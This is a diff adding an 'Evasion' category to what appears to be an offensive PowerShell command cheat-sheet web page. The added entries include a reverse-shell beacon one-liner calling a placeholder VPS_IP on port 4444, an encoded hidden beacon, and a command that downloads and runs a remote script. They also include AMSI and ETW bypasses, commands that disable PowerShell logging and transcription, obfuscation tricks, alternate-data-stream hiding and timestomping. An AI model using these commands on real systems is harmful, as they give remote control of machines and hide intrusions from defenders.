@@ -99,10 +99,13 @@
   .tag.persist.active { background: #e74c3c; color: #fff; }
   .tag.firewall { color: #3498db; border-color: #3498db; }
   .tag.firewall.active { background: #3498db; color: #fff; }
+  .tag.evasion { color: #e91e63; border-color: #e91e63; }
+  .tag.evasion.active { background: #e91e63; color: #fff; }
   .cmd-tag.c2 { color: #ff6b35; border-color: #ff6b35; }
   .cmd-tag.privesc { color: #9b59b6; border-color: #9b59b6; }
   .cmd-tag.persist { color: #e74c3c; border-color: #e74c3c; }
   .cmd-tag.firewall { color: #3498db; border-color: #3498db; }
+  .cmd-tag.evasion { color: #e91e63; border-color: #e91e63; }
   .cmd-count {
     text-align: center;
     font-size: 0.6rem;
@@ -210,6 +213,7 @@
   <div class="tag privesc" data-filter="privesc">PrivEsc</div>
   <div class="tag persist" data-filter="persist">Persist</div>
   <div class="tag firewall" data-filter="firewall">Firewall</div>
+  <div class="tag evasion" data-filter="evasion">Evasion</div>
 </div>
 
 <div class="cmd-count" id="count">Loading...</div>
@@ -848,6 +852,126 @@ const COMMANDS = [
     code: "Get-NetIPAddress | Select-Object IPAddress, InterfaceAlias",
     tags: ["ps"],
     accent: "#00f0ff"
+  },
+  {
+    title: "Encoded Beacon (Full)",
+    code: "powershell -ep bypass -w hidden -enc IwAgAFAAZQByAHMAaQBzAHQAZQBuAHQAIAByAGUAdgBlAHIAcwBlACAAcwBoAGUAbABsAC...",
+    tags: ["ps", "evasion", "c2"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Minified Beacon (One-liner)",
+    code: "$h=\"VPS_IP\";$p=4444;while(1){try{$t=New-Object Net.Sockets.TCPClient($h,$p);$s=$t.GetStream();$w=New-Object IO.StreamWriter($s);$r=New-Object IO.StreamReader($s);$w.AutoFlush=1;$w.WriteLine(\"[+] $env:COMPUTERNAME\$env:USERNAME\");while($t.Connected){$w.Write(\"PS> \");$c=$r.ReadLine();if(!$c-or$c-eq'exit'){break};try{$w.WriteLine((iex $c 2>&1|Out-String).TrimEnd())}catch{$w.WriteLine(\"ERR: $_\")}}$t.Close()}catch{};sleep 10}",
+    tags: ["ps", "evasion", "c2"],
+    accent: "#e91e63"
+  },
+  {
+    title: "AMSI Bypass (Reflection)",
+    code: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "AMSI Bypass (Patching)",
+    code: "$a=[Ref].Assembly.GetTypes()|?{$_.Name-like'*siUtils'};$f=$a.GetFields('NonPublic,Static')|?{$_.Name-like'*Context'};$f.SetValue($null,[IntPtr]::Zero)",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Disable Script Block Logging",
+    code: "$k='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging';if(!(Test-Path $k)){New-Item $k -Force};Set-ItemProperty $k -Name EnableScriptBlockLogging -Value 0",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Disable Module Logging",
+    code: "$k='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging';if(!(Test-Path $k)){New-Item $k -Force};Set-ItemProperty $k -Name EnableModuleLogging -Value 0",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Disable Transcription",
+    code: "$k='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription';if(!(Test-Path $k)){New-Item $k -Force};Set-ItemProperty $k -Name EnableTranscripting -Value 0",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "ETW Bypass (Disable Tracing)",
+    code: "[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Constrained Language Mode Bypass",
+    code: "$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Parent PID Spoofing Setup",
+    code: "$pi=New-Object System.Diagnostics.ProcessStartInfo;$pi.FileName='cmd.exe';$pi.Arguments='/c whoami';$pi.UseShellExecute=$false;$p=[System.Diagnostics.Process]::Start($pi)",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Base64 Encode Command",
+    code: "$cmd='whoami';$bytes=[System.Text.Encoding]::Unicode.GetBytes($cmd);[Convert]::ToBase64String($bytes)",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "XOR Obfuscation",
+    code: "$key=0x42;$enc=[System.Text.Encoding]::UTF8.GetBytes('whoami')|%{$_-bxor$key};$dec=$enc|%{$_-bxor$key};[System.Text.Encoding]::UTF8.GetString($dec)|iex",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "String Concatenation Obfuscation",
+    code: "$a='who';$b='ami';iex($a+$b)",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Environment Variable Stash",
+    code: "$env:x='IEX(IWR http://VPS/b.ps1)';powershell -c $env:x",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Invoke via Reflection",
+    code: "[ScriptBlock]::Create('whoami').Invoke()",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Double Base64 Encode",
+    code: "$c='whoami';$e1=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c));$e2=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($e1));Write-Host $e2",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "GZip Compressed Payload",
+    code: "$s=[IO.MemoryStream]::new();$g=[IO.Compression.GZipStream]::new($s,[IO.Compression.CompressionMode]::Compress);$w=[IO.StreamWriter]::new($g);$w.Write('whoami');$w.Close();[Convert]::ToBase64String($s.ToArray())",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Alternate Data Stream Hide",
+    code: "Set-Content -Path C:\temp\legit.txt -Value 'normal' -Stream ':hidden' -Value 'malicious payload'",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Process Hollowing Check",
+    code: "Get-Process | Where-Object {$_.Modules.Count -eq 0}",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "Timestomp File",
+    code: "$f='C:\temp\file.exe';$d=Get-Date '01/01/2020';(Get-Item $f).CreationTime=$d;(Get-Item $f).LastWriteTime=$d;(Get-Item $f).LastAccessTime=$d",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
   },
 ];
 
